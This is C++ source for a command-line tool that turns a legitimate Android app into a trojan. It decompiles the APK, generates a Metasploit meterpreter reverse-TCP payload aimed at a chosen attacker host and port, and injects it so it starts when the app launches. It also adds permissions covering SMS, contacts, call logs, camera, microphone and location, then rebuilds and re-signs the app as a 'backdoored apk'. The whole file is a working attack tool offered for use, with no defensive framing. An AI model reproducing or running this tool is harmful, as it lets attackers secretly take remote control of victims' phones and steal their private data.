#include <iostream>
#include <fstream>
#include <cstdlib>
#include <string>

std::string META_PERMESSIONS[23] =
{
	 "    <uses-permission android:name=\"android.permission.INTERNET\"/>"
	,"    <uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"/>"
    ,"    <uses-permission android:name=\"android.permission.CHANGE_WIFI_STATE\"/>"
    ,"    <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/>"
    ,"    <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\"/>"
    ,"    <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/>"
    ,"    <uses-permission android:name=\"android.permission.READ_PHONE_STATE\"/>"
    ,"    <uses-permission android:name=\"android.permission.SEND_SMS\"/>"
    ,"    <uses-permission android:name=\"android.permission.RECEIVE_SMS\"/>"
    ,"    <uses-permission android:name=\"android.permission.RECORD_AUDIO\"/>"
    ,"    <uses-permission android:name=\"android.permission.CALL_PHONE\"/>"
    ,"    <uses-permission android:name=\"android.permission.READ_CONTACTS\"/>"
    ,"    <uses-permission android:name=\"android.permission.WRITE_CONTACTS\"/>"
    ,"    <uses-permission android:name=\"android.permission.RECORD_AUDIO\"/>"
    ,"    <uses-permission android:name=\"android.permission.WRITE_SETTINGS\"/>"
    ,"    <uses-permission android:name=\"android.permission.CAMERA\"/>"
    ,"    <uses-permission android:name=\"android.permission.READ_SMS\"/>"
    ,"    <uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>"
    ,"    <uses-permission android:name=\"android.permission.RECEIVE_BOOT_COMPLETED\"/>"
    ,"    <uses-permission android:name=\"android.permission.SET_WALLPAPER\"/>"
    ,"    <uses-permission android:name=\"android.permission.READ_CALL_LOG\"/>"
    ,"    <uses-permission android:name=\"android.permission.WRITE_CALL_LOG\"/>"
    ,"    <uses-permission android:name=\"android.permission.WAKE_LOCK\"/>"

};



bool ITS_FOUND(std::string I)
{
	for(int i=0;i<23;++i) {if(I.find(META_PERMESSIONS[i])!=std::string::npos &&
	META_PERMESSIONS[i]!="") return true;} return false; 
}

std::string ANDROID_MAINSCREEN()
{
	std::string AMS;
	std::ifstream in("original/AndroidManifest.xml", std::ios::in);
	if(in)
	{
		std::string line,LINE;
		int index;
		while(!in.eof())
		{
			std::getline(in, line);
			if(line.find("<activity")!=std::string::npos) break;
		}
		for(int i=int(line.find("android:name="))+14; i<line.size(); ++i) LINE+=line[i];
		for(int i=0; i<int(LINE.find("\"")); ++i) AMS+=LINE[i];
		in.close();
	}
	for(int i=0; i<AMS.size(); ++i) if(AMS[i]=='.') AMS[i]='/';
	AMS = "original/smali/" + AMS + ".smali";
	return AMS;
}
void INJECT_FILES(std::string Name)
{
	std::string Cmd="mkdir  original/smali/com/"+Name;
	system(Cmd.c_str());
	Cmd+="/stage/";
	system(Cmd.c_str());
	std::string SedCmd="sed -i s/metasploit/"+Name+"/g payload/smali/com/metasploit/stage/*";
	system(SedCmd.c_str());
	Cmd="cp payload/smali/com/metasploit/stage/* original/smali/com/"+Name+"/stage/";
	system(Cmd.c_str());
}

void INJECT_CMD()
{
	INJECT_FILES("Cpp");
	std::fstream in("original/AndroidManifest.xml", std::ios::in);
	std::fstream out("TMP_AndroidManifest.xml", std::ios::out);
	if(in)
	{
		std::string line;
		int ctr=0;
		while(!in.eof())
		{
			int p=1;
			std::getline(in, line);
			if(line.find("<uses-permission")!=std::string::npos && ctr==0 &&
				!ITS_FOUND(line))
			{
				for(int i=0; i<23 ; i++)
				{
					out << META_PERMESSIONS[i]; out << std::endl; META_PERMESSIONS[i]="";
				}
				ctr=1;
			}
			else if(ITS_FOUND(line)) continue;
			else {out << line; out << std::endl;}
			
		}
		in.close();
		out.close();
		system("mv TMP_AndroidManifest.xml original/AndroidManifest.xml");
		std::ifstream MAIN_SC(ANDROID_MAINSCREEN().c_str(), std::ios::in); // android main screen
		std::ofstream TMP_MAIN("main.smali", std::ios::out);
		if(MAIN_SC)
		{
			std::string LINE;
			int i=0;
			while(!MAIN_SC.eof())
			{
				std::getline(MAIN_SC, LINE);
				if(LINE.find(";->onCreate(Landroid/os/Bundle;)V")!=std::string::npos && i==0)
					{i++; TMP_MAIN << LINE << std::endl; TMP_MAIN << "\n    invoke-static {p0}, Lcom/Cpp/stage/Payload;->start(Landroid/content/Context;)V\n";}
				else{TMP_MAIN << LINE << std::endl;}
			}
			MAIN_SC.close();
			TMP_MAIN.close();
			std::string MOVE="mv main.smali "+ANDROID_MAINSCREEN();
			system(MOVE.c_str());
		}
	}
}

void COMPILER(std::string AppDir, std::string IP, std::string port)
{
	std::string AppName1, AppName2;
	for(int x=AppDir.size()-1; x>=0; x--){if(AppDir[x]=='/') break; else AppName1+=AppDir[x];}
	for(int x=AppName1.size()-1; x>=0; x--) AppName2+=AppName1[x];
	std::string Cmd="apktool -f d "+AppDir+" -o original"; system(Cmd.c_str()); // Decompiling the original apk
	Cmd="msfvenom -p android/meterpreter/reverse_tcp lhost="+IP+" lport="+port+" -o payload.apk";
	system(Cmd.c_str()); // Generating metasploit payload
	system("apktool d -f payload.apk -o payload"); // Decompiling payload
	INJECT_CMD();
	system("apktool b original"); //Recompiling the original apk
	system("rm -rf payload payload.apk");
	std::string KeyC="jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore tmp.keystore original/dist/"+AppName2+" math";
	system("keytool -genkey -v -keystore tmp.keystore -alias math -keyalg RSA -keysize 2048 -validity 10000");
	system(KeyC.c_str());
	system("rm tmp.keystore");
	std::cout << "your backdoored apk -> original/dist/" <<  AppName2 << std::endl;

}


int main(int argc, char* argv[])
{
	std::string AppDir;
	std::string IP;
	std::string port;
	if(argc!=4)
	{
		std::cout << "\tC++ Tool For Injecting Metasploit Payload To An Original APK file." << std::endl;
		std::cout << "\nUsage:\n./ij-apk lhost=<ip or host> lport=<port> apk=<original apk>\n";
		exit(0);
	}
	else
	{
		for(int k=1; k<4; k++)
		{
			std::string tmp=argv[k];
			if(tmp.find("lhost")!=std::string::npos)
			{
				for(int i=int(tmp.find("lhost="))+6; i<tmp.size(); ++i) IP+=tmp[i];
			}
			else if(tmp.find("lport")!=std::string::npos)
			{
				for(int i=int(tmp.find("lport="))+6; i<tmp.size(); ++i) port+=tmp[i];
			}
			else
			{
				for(int i=int(tmp.find("apk="))+4; i<tmp.size(); ++i) AppDir+=tmp[i];
			}
		}
	}
	COMPILER(AppDir, IP, port);

}
